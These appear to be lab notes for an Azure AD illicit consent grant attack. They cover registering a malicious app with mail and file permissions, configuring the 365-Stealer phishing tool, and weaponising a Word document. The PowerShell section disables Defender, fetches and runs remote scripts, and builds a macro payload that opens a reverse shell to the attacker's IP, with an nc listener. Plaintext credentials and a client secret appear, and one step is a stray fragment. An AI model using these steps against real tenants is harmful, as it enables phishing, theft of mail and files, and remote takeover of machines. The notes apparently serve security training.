# Illicit Consent Grant Attack
![test](/img/illicit_consent_grant_attack.png "Illicit Consent Grant Attack").

1. Register a multitenant application attacker in defcorpextcontractors tenant
2. Provide the redirect URI where you would like to receive tokens. `https://172.16.151.X/login/authorized`
3. Go to the `Certificates&Secrets` blade and create new client secret. Copy the client secret before browsing away from the page
4. Go to the `API permissions` blade and add the following Delegated permissions for;
    - `Microsoft Graph:user.read`
    - `User.ReadBasic.All`
    - `mail.read`
    - `notes.read.all`
    - `mailboxsettings.readwrite`
    - `files.readwrite.all`
    - `mail.send`
5. Setup [365-Stealer](#365-Stealer) via GUI or cli
6. Send the phishing link
7. Upload the attackerx.doc 

## Get reverse shell
1. Browse to the 365-stealer dashboard `http://localhost:82/` and copy the access token for admin user. Use this token to upload weaponized word file on admin's drive.
2. Create doc file from attacker VM, run the below command to access MS Office's machine.
    ```powershell
    $passwd = ConvertTo-SecureString "ForCreatingWordDocs@123" -AsPlainText -Force
    $creds = New-Object System.Management.Automation.PSCredential("office-vm\administrator",$passwd)
    $officeVM = New-PSSession -ComputerName 172.16.1.250 -Credential $creds
    Enter-PSSession -Session $officeVM
    Set-MpPreference -DisableRealtimeMonitoring $true
    iex(New-Object Net.Webclient).downloadstring("http://172.16.150.x:82/Out-Word.ps1")

    # Create the word document
    Out-Word -Payload "powershell iex(New-Object Net.WebClient).downloadstring('http://172.16.150.x:82/Invoke-PowerShellTcp.ps1');Power -Reverse -IPAddress 172.16.150.x -Port 4444" -OutputFile attackerx.doc
    exit
    
    # copy the generated file to the attacker VM
    Copy-Item -FromSession $officeVM -Path C:\Users\Administrator\Documents\attackerx.doc -Destination C:\AzAD\Tools\attackerx.doc

    # Start the nc listener
    C:\AzAD\Tools\netcat-win32-1.12\nc64.exe -lvp 4444
    ```
3. asd

<br>



# 365-Stealer 
***Configure 365-Stealer from GUI***
  - Copy the `365-Stealer` directory to `C:\xampp\htdocs`
  - `http://localhost:82/365-stealer/yourVictims` and click `365-Stealer Configuration`
  - Enter CLIENTID, REDIRECTURL and CLIENTSSECRET 
  - Run 365-Stealer

<br>
<br>

***Configure 365-Stealer from cli***
```python
python 365-stealer.ph --set-config

Client ID ==> e06c6a0c-27bc-433a-b06e-5ef5ab0530af
Client Secret ==> am0ZV1a7xms6nW_AwMqAE~~kco1nNcBc.L
Redirect Url ==> https://172.16.150.X/login/authorized
Redirect Url After Stealing ==>
Macros File Path ==>
OneDrive Extensions ==>
Delay ==> 1

python 365-Stealer.py --run-app

# Upload documetn via cli
python 365-Stealer.py --refresh-user victim@defcorphq.onmicrosoft.com --upload C:\AzAD\Tools\attackerx.doc
```
